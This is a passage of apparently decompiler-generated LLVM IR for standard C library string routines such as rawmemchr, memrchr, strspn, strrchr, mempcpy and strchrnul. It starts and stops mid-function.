  %v2_1aa3011 = icmp eq i8 %v2_1aa2c9, 0
  store i32 %v0_1aa10, i32* @r0, align 4
  %v1_1aa3812 = add i32 %v0_1aa0c, 1
  store i32 %v1_1aa3812, i32* @r4, align 4
  br i1 %v2_1aa3011, label %dec_label_pc_1aa40, label %dec_label_pc_1aa1c

dec_label_pc_1aa1c:                               ; preds = %entry, %dec_label_pc_1aa28
  %v3_1aa2c14.in = phi i8 [ %v2_1aa2c, %dec_label_pc_1aa28 ], [ %v2_1aa2c9, %entry ]
  %v0_1aa3413 = phi i32 [ %v0_1aa34.pre, %dec_label_pc_1aa28 ], [ %v0_1aa10, %entry ]
  %v3_1aa2c14 = zext i8 %v3_1aa2c14.in to i32
  %v2_1aa1c = call i32 @__GI_strchr(i32 %v0_1aa3413, i32 %v3_1aa2c14)
  %v2_1aa20 = icmp eq i32 %v2_1aa1c, 0
  %v0_1aa28 = load i32, i32* @r5, align 4
  br i1 %v2_1aa20, label %dec_label_pc_1aa28, label %dec_label_pc_1aa40

dec_label_pc_1aa28:                               ; preds = %dec_label_pc_1aa1c
  %v1_1aa28 = add i32 %v0_1aa28, 1
  %v0_1aa2c.pre = load i32, i32* @r4, align 4
  %v0_1aa34.pre = load i32, i32* @r6, align 4
  store i32 %v1_1aa28, i32* @r5, align 4
  %v1_1aa2c = inttoptr i32 %v0_1aa2c.pre to i8*
  %v2_1aa2c = load i8, i8* %v1_1aa2c, align 1
  %v2_1aa30 = icmp eq i8 %v2_1aa2c, 0
  store i32 %v0_1aa34.pre, i32* @r0, align 4
  %v1_1aa38 = add i32 %v0_1aa2c.pre, 1
  store i32 %v1_1aa38, i32* @r4, align 4
  br i1 %v2_1aa30, label %dec_label_pc_1aa40, label %dec_label_pc_1aa1c

dec_label_pc_1aa40:                               ; preds = %dec_label_pc_1aa28, %dec_label_pc_1aa1c, %entry
  %v0_1aa40 = phi i32 [ 0, %entry ], [ %v0_1aa28, %dec_label_pc_1aa1c ], [ %v1_1aa28, %dec_label_pc_1aa28 ]
  %v2_1aa44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1aa44, i32* @r4, align 4
  store i32 %v6_1aa08, i32* @r5, align 4
  store i32 %v9_1aa08, i32* @r6, align 4
  ret i32 %v0_1aa40

; uselistorder directives
  uselistorder i8 %v2_1aa2c, { 1, 0 }
  uselistorder i32 %v0_1aa34.pre, { 1, 0 }
  uselistorder i32 %v0_1aa2c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_1aa1c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1aa50 = urem i32 %arg1, 256
  %v0_1aa682 = load i32, i32* @r0, align 4
  %v1_1aa683 = urem i32 %v0_1aa682, 4
  %v2_1aa684 = icmp eq i32 %v1_1aa683, 0
  br i1 %v2_1aa684, label %dec_label_pc_1aa70, label %dec_label_pc_1aa58

dec_label_pc_1aa58:                               ; preds = %entry, %dec_label_pc_1aa64
  %v0_1aa64 = phi i32 [ %v1_1aa64, %dec_label_pc_1aa64 ], [ %v0_1aa682, %entry ]
  %v1_1aa58 = inttoptr i32 %v0_1aa64 to i8*
  %v2_1aa58 = load i8, i8* %v1_1aa58, align 1
  %v3_1aa58 = zext i8 %v2_1aa58 to i32
  %v9_1aa5c = icmp eq i32 %v3_1aa58, %v1_1aa50
  br i1 %v9_1aa5c, label %dec_label_pc_1aaec, label %dec_label_pc_1aa64

dec_label_pc_1aa64:                               ; preds = %dec_label_pc_1aa58
  %v1_1aa64 = add i32 %v0_1aa64, 1
  %v1_1aa68 = urem i32 %v1_1aa64, 4
  %v2_1aa68 = icmp eq i32 %v1_1aa68, 0
  br i1 %v2_1aa68, label %dec_label_pc_1aa70, label %dec_label_pc_1aa58

dec_label_pc_1aa70:                               ; preds = %dec_label_pc_1aa64, %entry
  %v0_1aa74 = phi i32 [ %v0_1aa682, %entry ], [ %v1_1aa64, %dec_label_pc_1aa64 ]
  %v4_1aa70 = mul nuw nsw i32 %v1_1aa50, 256
  %v5_1aa70 = or i32 %v4_1aa70, %v1_1aa50
  %v4_1aa78 = mul i32 %v5_1aa70, 65536
  %v5_1aa78 = or i32 %v4_1aa78, %v5_1aa70
  br label %dec_label_pc_1aa7c

dec_label_pc_1aa7c:                               ; preds = %dec_label_pc_1aadc, %dec_label_pc_1aa7c, %dec_label_pc_1aa70
  %v0_1aac0 = phi i32 [ %v0_1aa74, %dec_label_pc_1aa70 ], [ %v4_1aa7c, %dec_label_pc_1aa7c ], [ %v4_1aa7c, %dec_label_pc_1aadc ]
  %v1_1aa7c = inttoptr i32 %v0_1aac0 to i32*
  %v2_1aa7c = load i32, i32* %v1_1aa7c, align 4
  %v4_1aa7c = add i32 %v0_1aac0, 4
  %v2_1aa84 = xor i32 %v2_1aa7c, %v5_1aa78
  %v2_1aa88 = add i32 %v2_1aa84, 2130640639
  %v1_1aa90 = sub i32 -1, %v2_1aa84
  %v2_1aa94 = xor i32 %v2_1aa88, %v1_1aa90
  %v2_1aa98 = and i32 %v2_1aa94, -2130640640
  %v2_1aa9c = icmp eq i32 %v2_1aa98, 0
  br i1 %v2_1aa9c, label %dec_label_pc_1aa7c, label %dec_label_pc_1aaa4

dec_label_pc_1aaa4:                               ; preds = %dec_label_pc_1aa7c
  %v2_1aaa4 = inttoptr i32 %v0_1aac0 to i8*
  %v3_1aaa4 = load i8, i8* %v2_1aaa4, align 1
  %v4_1aaa4 = zext i8 %v3_1aaa4 to i32
  %v9_1aaac = icmp eq i32 %v4_1aaa4, %v1_1aa50
  %v1_1aab0 = add i32 %v0_1aac0, 3
  br i1 %v9_1aaac, label %dec_label_pc_1aaec, label %dec_label_pc_1aab8

dec_label_pc_1aab8:                               ; preds = %dec_label_pc_1aaa4
  %v1_1aab8 = add i32 %v0_1aac0, 1
  %v2_1aab8 = inttoptr i32 %v1_1aab8 to i8*
  %v3_1aab8 = load i8, i8* %v2_1aab8, align 1
  %v4_1aab8 = zext i8 %v3_1aab8 to i32
  %v9_1aabc = icmp eq i32 %v4_1aab8, %v1_1aa50
  br i1 %v9_1aabc, label %bb, label %dec_label_pc_1aacc

bb:                                               ; preds = %dec_label_pc_1aab8
  br label %dec_label_pc_1aaec

dec_label_pc_1aacc:                               ; preds = %dec_label_pc_1aab8
  %v1_1aacc = add i32 %v0_1aac0, 2
  %v2_1aacc = inttoptr i32 %v1_1aacc to i8*
  %v3_1aacc = load i8, i8* %v2_1aacc, align 1
  %v4_1aacc = zext i8 %v3_1aacc to i32
  %v9_1aad0 = icmp eq i32 %v4_1aacc, %v1_1aa50
  br i1 %v9_1aad0, label %dec_label_pc_1aaec, label %dec_label_pc_1aadc

dec_label_pc_1aadc:                               ; preds = %dec_label_pc_1aacc
  %v2_1aadc = inttoptr i32 %v1_1aab0 to i8*
  %v3_1aadc = load i8, i8* %v2_1aadc, align 1
  %v4_1aadc = zext i8 %v3_1aadc to i32
  %v9_1aae0 = icmp eq i32 %v4_1aadc, %v1_1aa50
  br i1 %v9_1aae0, label %dec_label_pc_1aae8, label %dec_label_pc_1aa7c

dec_label_pc_1aae8:                               ; preds = %dec_label_pc_1aadc
  br label %dec_label_pc_1aaec

dec_label_pc_1aaec:                               ; preds = %dec_label_pc_1aa58, %dec_label_pc_1aacc, %dec_label_pc_1aaa4, %bb, %dec_label_pc_1aae8
  %v1_1aaf0 = phi i32 [ %v1_1aab0, %dec_label_pc_1aae8 ], [ %v1_1aab8, %bb ], [ %v1_1aacc, %dec_label_pc_1aacc ], [ %v0_1aac0, %dec_label_pc_1aaa4 ], [ %v0_1aa64, %dec_label_pc_1aa58 ]
  ret i32 %v1_1aaf0

; uselistorder directives
  uselistorder i32 %v4_1aa7c, { 1, 0 }
  uselistorder i32 %v0_1aac0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1aa70, { 1, 0 }
  uselistorder i32 %v1_1aa64, { 1, 0, 2 }
  uselistorder i32 %v0_1aa682, { 2, 1, 0 }
  uselistorder i32 %v1_1aa50, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1aaec, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1aa58, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1ab00 = urem i32 %arg2, 256
  %v2_1ab04 = add i32 %arg3, %arg1
  %v2_1ab1c4 = icmp eq i32 %arg3, 0
  br i1 %v2_1ab1c4, label %dec_label_pc_1ab2c, label %dec_label_pc_1ab24

dec_label_pc_1ab0c:                               ; preds = %dec_label_pc_1ab24
  %v1_1ab0c = add i32 %v0_1ab0c, -1
  %v2_1ab0c = inttoptr i32 %v1_1ab0c to i8*
  %v3_1ab0c = load i8, i8* %v2_1ab0c, align 1
  %v4_1ab0c = zext i8 %v3_1ab0c to i32
  %v9_1ab10 = icmp eq i32 %v4_1ab0c, %v1_1ab00
  br i1 %v9_1ab10, label %dec_label_pc_1abcc, label %dec_label_pc_1ab18

dec_label_pc_1ab18:                               ; preds = %dec_label_pc_1ab0c
  %v1_1ab18 = add i32 %v0_1ab18, -1
  %v2_1ab1c = icmp eq i32 %v1_1ab18, 0
  br i1 %v2_1ab1c, label %dec_label_pc_1ab2c, label %dec_label_pc_1ab24

dec_label_pc_1ab24:                               ; preds = %entry, %dec_label_pc_1ab18
  %v0_1ab18 = phi i32 [ %v1_1ab18, %dec_label_pc_1ab18 ], [ %arg3, %entry ]
  %v0_1ab0c = phi i32 [ %v1_1ab0c, %dec_label_pc_1ab18 ], [ %v2_1ab04, %entry ]
  %v1_1ab24 = urem i32 %v0_1ab0c, 4
  %v2_1ab24 = icmp eq i32 %v1_1ab24, 0
  br i1 %v2_1ab24, label %dec_label_pc_1ab2c, label %dec_label_pc_1ab0c

dec_label_pc_1ab2c:                               ; preds = %dec_label_pc_1ab18, %dec_label_pc_1ab24, %entry
  %v0_1abb413 = phi i32 [ %v2_1ab04, %entry ], [ %v1_1ab0c, %dec_label_pc_1ab18 ], [ %v0_1ab0c, %dec_label_pc_1ab24 ]
  %v0_1aba09 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1ab18 ], [ %v0_1ab18, %dec_label_pc_1ab24 ]
  %v4_1ab2c = mul nuw nsw i32 %v1_1ab00, 256
  %v5_1ab2c = or i32 %v4_1ab2c, %v1_1ab00
  %v4_1ab30 = mul i32 %v5_1ab2c, 65536
  %v5_1ab30 = or i32 %v4_1ab30, %v5_1ab2c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1aba09, 3
  br i1 %tmp, label %dec_label_pc_1ab38, label %dec_label_pc_1abc0

dec_label_pc_1ab38:                               ; preds = %dec_label_pc_1ab2c, %dec_label_pc_1aba0.backedge
  %v0_1ab5440 = phi i32 [ %v1_1ab54, %dec_label_pc_1aba0.backedge ], [ %v0_1aba09, %dec_label_pc_1ab2c ]
  %v0_1ab3839 = phi i32 [ %v1_1ab38, %dec_label_pc_1aba0.backedge ], [ %v0_1abb413, %dec_label_pc_1ab2c ]
  %v1_1ab38 = add i32 %v0_1ab3839, -4
  %v2_1ab38 = inttoptr i32 %v1_1ab38 to i32*
  %v3_1ab38 = load i32, i32* %v2_1ab38, align 4
  %v2_1ab3c = xor i32 %v3_1ab38, %v5_1ab30
  %v2_1ab40 = add i32 %v2_1ab3c, 2130640639
  store i32 %v2_1ab40, i32* @ip, align 4
  %v1_1ab44 = sub i32 -1, %v2_1ab3c
  %v2_1ab48 = xor i32 %v2_1ab40, %v1_1ab44
  %v2_1ab4c = and i32 %v2_1ab48, -2130640640
  %v2_1ab50 = icmp eq i32 %v2_1ab4c, 0
  %v1_1ab54 = add i32 %v0_1ab5440, -4
  br i1 %v2_1ab50, label %dec_label_pc_1aba0.backedge, label %dec_label_pc_1ab5c

dec_label_pc_1aba0.backedge:                      ; preds = %dec_label_pc_1ab38, %dec_label_pc_1ab94
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_1ab54, 3
  br i1 %tmp46, label %dec_label_pc_1ab38, label %dec_label_pc_1abc0

dec_label_pc_1ab5c:                               ; preds = %dec_label_pc_1ab38
  %v1_1ab5c = add i32 %v0_1ab3839, -1
  %v2_1ab5c = inttoptr i32 %v1_1ab5c to i8*
  %v3_1ab5c = load i8, i8* %v2_1ab5c, align 1
  %v4_1ab5c = zext i8 %v3_1ab5c to i32
  %v9_1ab60 = icmp eq i32 %v4_1ab5c, %v1_1ab00
  br i1 %v9_1ab60, label %dec_label_pc_1ab8c, label %dec_label_pc_1ab6c

dec_label_pc_1ab6c:                               ; preds = %dec_label_pc_1ab5c
  %v1_1ab6c = add i32 %v0_1ab3839, -2
  %v2_1ab6c = inttoptr i32 %v1_1ab6c to i8*
  %v3_1ab6c = load i8, i8* %v2_1ab6c, align 1
  %v4_1ab6c = zext i8 %v3_1ab6c to i32
  %v9_1ab70 = icmp eq i32 %v4_1ab6c, %v1_1ab00
  br i1 %v9_1ab70, label %dec_label_pc_1ab8c, label %dec_label_pc_1ab7c

dec_label_pc_1ab7c:                               ; preds = %dec_label_pc_1ab6c
  %v1_1ab7c = add i32 %v0_1ab3839, -3
  %v2_1ab7c = inttoptr i32 %v1_1ab7c to i8*
  %v3_1ab7c = load i8, i8* %v2_1ab7c, align 1
  %v4_1ab7c = zext i8 %v3_1ab7c to i32
  %v9_1ab80 = icmp eq i32 %v4_1ab7c, %v1_1ab00
  br i1 %v9_1ab80, label %dec_label_pc_1ab8c, label %dec_label_pc_1ab94

dec_label_pc_1ab8c:                               ; preds = %dec_label_pc_1ab7c, %dec_label_pc_1ab6c, %dec_label_pc_1ab5c
  %v0_1ab8c = phi i32 [ %v1_1ab7c, %dec_label_pc_1ab7c ], [ %v1_1ab6c, %dec_label_pc_1ab6c ], [ %v1_1ab5c, %dec_label_pc_1ab5c ]
  br label %dec_label_pc_1abcc

dec_label_pc_1ab94:                               ; preds = %dec_label_pc_1ab7c
  %v1_1ab94 = inttoptr i32 %v1_1ab38 to i8*
  %v2_1ab94 = load i8, i8* %v1_1ab94, align 1
  %v3_1ab94 = zext i8 %v2_1ab94 to i32
  %v9_1ab98 = icmp eq i32 %v3_1ab94, %v1_1ab00
  br i1 %v9_1ab98, label %dec_label_pc_1abcc, label %dec_label_pc_1aba0.backedge

dec_label_pc_1abb4:                               ; preds = %dec_label_pc_1abc0
  %v1_1abc0 = add i32 %v0_1abc0, -1
  %v1_1abb4 = add i32 %v0_1abb4, -1
  %v2_1abb4 = inttoptr i32 %v1_1abb4 to i8*
  %v3_1abb4 = load i8, i8* %v2_1abb4, align 1
  %v4_1abb4 = zext i8 %v3_1abb4 to i32
  %v9_1abb8 = icmp eq i32 %v4_1abb4, %v1_1ab00
  br i1 %v9_1abb8, label %dec_label_pc_1abcc, label %dec_label_pc_1abc0

dec_label_pc_1abc0:                               ; preds = %dec_label_pc_1ab2c, %dec_label_pc_1aba0.backedge, %dec_label_pc_1abb4
  %v0_1abb4 = phi i32 [ %v1_1abb4, %dec_label_pc_1abb4 ], [ %v0_1abb413, %dec_label_pc_1ab2c ], [ %v1_1ab38, %dec_label_pc_1aba0.backedge ]
  %v0_1abc0 = phi i32 [ %v1_1abc0, %dec_label_pc_1abb4 ], [ %v0_1aba09, %dec_label_pc_1ab2c ], [ %v1_1ab54, %dec_label_pc_1aba0.backedge ]
  %v2_1abc0 = icmp eq i32 %v0_1abc0, 0
  br i1 %v2_1abc0, label %dec_label_pc_1abc8, label %dec_label_pc_1abb4

dec_label_pc_1abc8:                               ; preds = %dec_label_pc_1abc0
  br label %dec_label_pc_1abcc

dec_label_pc_1abcc:                               ; preds = %dec_label_pc_1ab0c, %dec_label_pc_1ab94, %dec_label_pc_1abb4, %dec_label_pc_1ab8c, %dec_label_pc_1abc8
  %v1_1abd0 = phi i32 [ %v0_1ab8c, %dec_label_pc_1ab8c ], [ 0, %dec_label_pc_1abc8 ], [ %v1_1abb4, %dec_label_pc_1abb4 ], [ %v1_1ab38, %dec_label_pc_1ab94 ], [ %v1_1ab0c, %dec_label_pc_1ab0c ]
  ret i32 %v1_1abd0

; uselistorder directives
  uselistorder i32 %v0_1abc0, { 1, 0 }
  uselistorder i32 %v1_1ab54, { 1, 0, 2 }
  uselistorder i32 %v1_1ab38, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1ab3839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1ab2c, { 1, 0 }
  uselistorder i32 %v0_1aba09, { 1, 2, 0 }
  uselistorder i32 %v0_1ab0c, { 1, 0, 2 }
  uselistorder i32 %v2_1ab04, { 1, 0 }
  uselistorder i32 %v1_1ab00, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1abcc, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1abc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1aba0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1ab38, { 1, 0 }
  uselistorder label %dec_label_pc_1ab2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1ab24, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1ac0c2 = load i32, i32* @r0, align 4
  %v1_1ac0c3 = inttoptr i32 %v0_1ac0c2 to i8*
  %v2_1ac0c4 = load i8, i8* %v1_1ac0c3, align 1
  %v3_1ac0c5 = zext i8 %v2_1ac0c4 to i32
  store i32 %v3_1ac0c5, i32* @ip, align 4
  %v2_1ac106 = icmp eq i8 %v2_1ac0c4, 0
  br i1 %v2_1ac106, label %dec_label_pc_1ac1c, label %dec_label_pc_1abf0.preheader

dec_label_pc_1abe8:                               ; preds = %dec_label_pc_1abf0
  %v3_1abf0 = zext i8 %v2_1abf0 to i32
  %v1_1abf8 = add i32 %v0_1abf8, 1
  %v9_1abe8 = icmp eq i32 %v0_1abe810, %v3_1abf0
  br i1 %v9_1abe8, label %dec_label_pc_1ac04, label %dec_label_pc_1abf0

dec_label_pc_1abf0:                               ; preds = %dec_label_pc_1abf0.preheader, %dec_label_pc_1abe8
  %v0_1abf8 = phi i32 [ %tmp, %dec_label_pc_1abf0.preheader ], [ %v1_1abf8, %dec_label_pc_1abe8 ]
  %v1_1abf0 = inttoptr i32 %v0_1abf8 to i8*
  %v2_1abf0 = load i8, i8* %v1_1abf0, align 1
  %v2_1abf4 = icmp eq i8 %v2_1abf0, 0
  br i1 %v2_1abf4, label %dec_label_pc_1ac1c, label %dec_label_pc_1abe8

dec_label_pc_1ac04:                               ; preds = %dec_label_pc_1abe8
  %v1_1ac04 = add i32 %v0_1ac04, 1
  %v1_1ac08 = add i32 %v0_1ac08, 1
  %v1_1ac0c = inttoptr i32 %v1_1ac08 to i8*
  %v2_1ac0c = load i8, i8* %v1_1ac0c, align 1
  %v3_1ac0c = zext i8 %v2_1ac0c to i32
  store i32 %v3_1ac0c, i32* @ip, align 4
  %v2_1ac10 = icmp eq i8 %v2_1ac0c, 0
  br i1 %v2_1ac10, label %dec_label_pc_1ac1c, label %dec_label_pc_1abf0.preheader

dec_label_pc_1abf0.preheader:                     ; preds = %entry, %dec_label_pc_1ac04
  %v0_1ac08 = phi i32 [ %v1_1ac08, %dec_label_pc_1ac04 ], [ %v0_1ac0c2, %entry ]
  %v0_1ac04 = phi i32 [ %v1_1ac04, %dec_label_pc_1ac04 ], [ 0, %entry ]
  %v0_1abe810 = phi i32 [ %v3_1ac0c, %dec_label_pc_1ac04 ], [ %v3_1ac0c5, %entry ]
  br label %dec_label_pc_1abf0

dec_label_pc_1ac1c:                               ; preds = %dec_label_pc_1ac04, %dec_label_pc_1abf0, %entry
  %v0_1ac1c = phi i32 [ 0, %entry ], [ %v0_1ac04, %dec_label_pc_1abf0 ], [ %v1_1ac04, %dec_label_pc_1ac04 ]
  ret i32 %v0_1ac1c

; uselistorder directives
  uselistorder i32 %v0_1abf8, { 1, 0 }
  uselistorder label %dec_label_pc_1abf0.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1ac2c = urem i32 %arg2, 256
  store i32 %v1_1ac2c, i32* @r4, align 4
  %v2_1ac2c = icmp eq i32 %v1_1ac2c, 0
  br i1 %v2_1ac2c, label %dec_label_pc_1ac40, label %dec_label_pc_1ac54.preheader

dec_label_pc_1ac54.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1ac5c3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_1ac2c)
  %v2_1ac605 = icmp eq i32 %v2_1ac5c3, 0
  br i1 %v2_1ac605, label %dec_label_pc_1ac68, label %dec_label_pc_1ac4c

dec_label_pc_1ac40:                               ; preds = %entry
  %v2_1ac44 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1ac6c

dec_label_pc_1ac4c:                               ; preds = %dec_label_pc_1ac54.preheader, %dec_label_pc_1ac4c
  %v2_1ac5c6 = phi i32 [ %v2_1ac5c, %dec_label_pc_1ac4c ], [ %v2_1ac5c3, %dec_label_pc_1ac54.preheader ]
  store i32 %v2_1ac5c6, i32* @r5, align 4
  %v1_1ac50 = add i32 %v2_1ac5c6, 1
  store i32 %v1_1ac50, i32* @r0, align 4
  %v0_1ac58 = load i32, i32* @r4, align 4
  %v2_1ac5c = call i32 @__GI_strchr(i32 %v1_1ac50, i32 %v0_1ac58)
  %v2_1ac60 = icmp eq i32 %v2_1ac5c, 0
  br i1 %v2_1ac60, label %dec_label_pc_1ac68, label %dec_label_pc_1ac4c

dec_label_pc_1ac68:                               ; preds = %dec_label_pc_1ac4c, %dec_label_pc_1ac54.preheader
  %v0_1ac68 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac6c

dec_label_pc_1ac6c:                               ; preds = %dec_label_pc_1ac40, %dec_label_pc_1ac68
  %storemerge = phi i32 [ %v2_1ac44, %dec_label_pc_1ac40 ], [ %v0_1ac68, %dec_label_pc_1ac68 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_1ac5c, { 1, 0 }
  uselistorder i32 %v1_1ac50, { 1, 0 }
  uselistorder i32 %v1_1ac2c, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1ac6c, { 1, 0 }
  uselistorder label %dec_label_pc_1ac4c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_1ac78 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1ac88 = call i32 @memcpy()
  %v0_1ac8c = load i32, i32* @r5, align 4
  %v1_1ac8c = load i32, i32* @r4, align 4
  %v2_1ac8c = add i32 %v1_1ac8c, %v0_1ac8c
  store i32 %v6_1ac78, i32* @r5, align 4
  ret i32 %v2_1ac8c
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1aca0 = urem i32 %arg1, 256
  %v0_1acc02 = load i32, i32* @r0, align 4
  %v1_1acc03 = urem i32 %v0_1acc02, 4
  %v2_1acc04 = icmp eq i32 %v1_1acc03, 0
  br i1 %v2_1acc04, label %dec_label_pc_1acc8, label %dec_label_pc_1aca8

dec_label_pc_1aca8:                               ; preds = %entry, %dec_label_pc_1acbc
  %v0_1acbc = phi i32 [ %v1_1acbc, %dec_label_pc_1acbc ], [ %v0_1acc02, %entry ]
  %v1_1aca8 = inttoptr i32 %v0_1acbc to i8*
  %v2_1aca8 = load i8, i8* %v1_1aca8, align 1
  %v3_1aca8 = zext i8 %v2_1aca8 to i32
  %v9_1acac = icmp eq i32 %v3_1aca8, %v1_1aca0
  br i1 %v9_1acac, label %dec_label_pc_1ad78, label %dec_label_pc_1acb4

dec_label_pc_1acb4:                               ; preds = %dec_label_pc_1aca8
  %v2_1acb4 = icmp eq i8 %v2_1aca8, 0
  br i1 %v2_1acb4, label %dec_label_pc_1ad78, label %dec_label_pc_1acbc

dec_label_pc_1acbc:                               ; preds = %dec_label_pc_1acb4
  %v1_1acbc = add i32 %v0_1acbc, 1
  %v1_1acc0 = urem i32 %v1_1acbc, 4
  %v2_1acc0 = icmp eq i32 %v1_1acc0, 0
  br i1 %v2_1acc0, label %dec_label_pc_1acc8, label %dec_label_pc_1aca8

dec_label_pc_1acc8:                               ; preds = %dec_label_pc_1acbc, %entry
  %v0_1accc = phi i32 [ %v0_1acc02, %entry ], [ %v1_1acbc, %dec_label_pc_1acbc ]
  %v4_1acc8 = mul nuw nsw i32 %v1_1aca0, 256
  %v5_1acc8 = or i32 %v4_1acc8, %v1_1aca0
  %v4_1acd0 = mul i32 %v5_1acc8, 65536
  %v5_1acd0 = or i32 %v4_1acd0, %v5_1acc8
  br label %dec_label_pc_1acd4

dec_label_pc_1acd4:                               ; preds = %dec_label_pc_1ad70, %dec_label_pc_1ad10, %dec_label_pc_1acc8
  %v0_1ad38 = phi i32 [ %v0_1accc, %dec_label_pc_1acc8 ], [ %v4_1acd4, %dec_label_pc_1ad10 ], [ %v4_1acd4, %dec_label_pc_1ad70 ]
  %v1_1acd4 = inttoptr i32 %v0_1ad38 to i32*
  %v2_1acd4 = load i32, i32* %v1_1acd4, align 4
  %v4_1acd4 = add i32 %v0_1ad38, 4
  %v2_1acdc = xor i32 %v2_1acd4, %v5_1acd0
  %v2_1ace0 = add i32 %v2_1acdc, 2130640639
  store i32 %v2_1ace0, i32* @ip, align 4
  %v2_1ace8 = add i32 %v2_1acd4, 2130640639
  %v1_1acec = sub i32 -1, %v2_1acd4
  %v2_1acf0 = xor i32 %v2_1ace8, %v1_1acec
  %v2_1acfc = and i32 %v2_1acf0, -2130640640
  %v2_1ad04 = icmp eq i32 %v2_1acfc, 0
  br i1 %v2_1ad04, label %dec_label_pc_1ad10, label %dec_label_pc_1ad18

dec_label_pc_1ad10:                               ; preds = %dec_label_pc_1acd4
  %v1_1acf8 = sub i32 -1, %v2_1acdc
  %v2_1ad00 = xor i32 %v2_1ace0, %v1_1acf8
  %v2_1ad08 = and i32 %v2_1ad00, -2130640640
  %v2_1ad10 = icmp eq i32 %v2_1ad08, 0
  br i1 %v2_1ad10, label %dec_label_pc_1acd4, label %dec_label_pc_1ad18

dec_label_pc_1ad18:                               ; preds = %dec_label_pc_1acd4, %dec_label_pc_1ad10
  %v2_1ad18 = inttoptr i32 %v0_1ad38 to i8*
  %v3_1ad18 = load i8, i8* %v2_1ad18, align 1
  %v4_1ad18 = zext i8 %v3_1ad18 to i32
  %v9_1ad1c = icmp eq i32 %v4_1ad18, %v1_1aca0
  br i1 %v9_1ad1c, label %dec_label_pc_1ad78, label %dec_label_pc_1ad28

dec_label_pc_1ad28:                               ; preds = %dec_label_pc_1ad18
  %v2_1ad28 = icmp eq i8 %v3_1ad18, 0
  br i1 %v2_1ad28, label %dec_label_pc_1ad78, label %dec_label_pc_1ad30

dec_label_pc_1ad30:                               ; preds = %dec_label_pc_1ad28
  %v1_1ad30 = add i32 %v0_1ad38, 1
  %v2_1ad30 = inttoptr i32 %v1_1ad30 to i8*
  %v3_1ad30 = load i8, i8* %v2_1ad30, align 1
  %v4_1ad30 = zext i8 %v3_1ad30 to i32
  %v9_1ad34 = icmp eq i32 %v4_1ad30, %v1_1aca0
  br i1 %v9_1ad34, label %dec_label_pc_1ad78, label %dec_label_pc_1ad40

dec_label_pc_1ad40:                               ; preds = %dec_label_pc_1ad30
  %v2_1ad40 = icmp eq i8 %v3_1ad30, 0
  br i1 %v2_1ad40, label %dec_label_pc_1ad78, label %dec_label_pc_1ad48

dec_label_pc_1ad48:                               ; preds = %dec_label_pc_1ad40
  %v1_1ad48 = add i32 %v0_1ad38, 2
  %v2_1ad48 = inttoptr i32 %v1_1ad48 to i8*
  %v3_1ad48 = load i8, i8* %v2_1ad48, align 1
  %v4_1ad48 = zext i8 %v3_1ad48 to i32
  %v9_1ad4c = icmp eq i32 %v4_1ad48, %v1_1aca0
  br i1 %v9_1ad4c, label %dec_label_pc_1ad78, label %dec_label_pc_1ad58

dec_label_pc_1ad58:                               ; preds = %dec_label_pc_1ad48
  %v2_1ad58 = icmp eq i8 %v3_1ad48, 0
  br i1 %v2_1ad58, label %dec_label_pc_1ad78, label %dec_label_pc_1ad60

dec_label_pc_1ad60:                               ; preds = %dec_label_pc_1ad58
  %v1_1ad60 = add i32 %v0_1ad38, 3
  %v2_1ad60 = inttoptr i32 %v1_1ad60 to i8*
  %v3_1ad60 = load i8, i8* %v2_1ad60, align 1
  %v4_1ad60 = zext i8 %v3_1ad60 to i32
  %v9_1ad64 = icmp eq i32 %v4_1ad60, %v1_1aca0
  br i1 %v9_1ad64, label %dec_label_pc_1ad78, label %dec_label_pc_1ad70

dec_label_pc_1ad70:                               ; preds = %dec_label_pc_1ad60
  %v2_1ad70 = icmp eq i8 %v3_1ad60, 0
  br i1 %v2_1ad70, label %dec_label_pc_1ad78, label %dec_label_pc_1acd4

